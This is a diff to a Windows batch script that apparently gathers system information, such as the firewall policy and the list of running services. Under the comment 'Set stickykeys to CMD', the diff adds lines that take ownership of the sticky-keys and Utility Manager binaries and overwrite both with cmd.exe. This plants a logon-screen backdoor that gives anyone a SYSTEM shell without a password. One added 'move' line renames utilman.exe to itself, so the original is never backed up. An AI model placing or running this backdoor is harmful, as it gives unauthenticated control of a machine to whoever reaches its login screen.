@@ -64,16 +64,20 @@ if %errorlevel%==1 echo "Failed to export firewall policy" >> C:\Wangblows\Wangb
 
 :: Set stickykeys to CMD
 takeown /f "%systemroot%\System32\sethc.exe"
+takeown /f "%systemroot%\System32\utilman.exe"
 takeown /f "%systemroot%\System32\cmd.exe"
 icacls "%systemroot%\System32\sethc.exe" /grant %username%:f
 icacls "%systemroot%\System32\cmd.exe" /grant %username%:f
-ren "%systemroot%\System32\sethc.exe" "%systemroot%\System32\sethc1.exe"
-copy "%systemroot%\System32\cmd.exe" "%systemroot%\System32\sethc.exe"
+icacls "%systemroot%\System32\utilman.exe" /grant %username%:f
+icacls "%systemroot%\System32\cmd.exe" /grant %username%:f
+move "%systemroot%\System32\sethc.exe" "%systemroot%\System32\sethc1.exe"
+copy /y "%systemroot%\System32\cmd.exe" "%systemroot%\System32\sethc.exe"
+move "%systemroot%\System32\utilman.exe" "%systemroot%\System32\utilman.exe"
+copy /y "%systemroot%\System32\cmd.exe" "%systemroot%\System32\utilman.exe"
 
 :@@@CURRENTLY RUNNING SERVICES@@@
 net start >> C:\Wangblows\Services_Started.txt
 if %errorlevel%==1 echo Running services failed to write >> C:\Wangblows\Wangblows.txt
-
 
 ::test michael is bi bi bii
 :MENU
